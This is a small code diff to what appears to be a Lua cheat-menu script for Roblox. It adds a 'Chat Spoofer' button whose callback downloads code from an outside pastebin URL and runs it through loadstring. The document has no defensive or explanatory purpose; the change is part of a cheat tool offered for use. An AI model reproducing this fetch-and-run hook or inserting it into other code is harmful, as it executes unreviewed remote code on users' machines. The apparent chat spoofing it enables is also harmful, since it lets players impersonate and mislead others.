@@ -402,6 +402,14 @@ local ScriptsSection = ScriptsTab:AddSection({
 })
 
 
+ScriptsTab:AddButton({
+	Name = "Chat Spoofer",
+	Callback = function()
+		loadstring(game:HttpGet(('https://pastebin.com/raw/djBfk8Li'),true))()
+	end
+})
+
+
 local AdminSection = ScriptsTab:AddSection({
 	Name = "Admin Panels"
 })
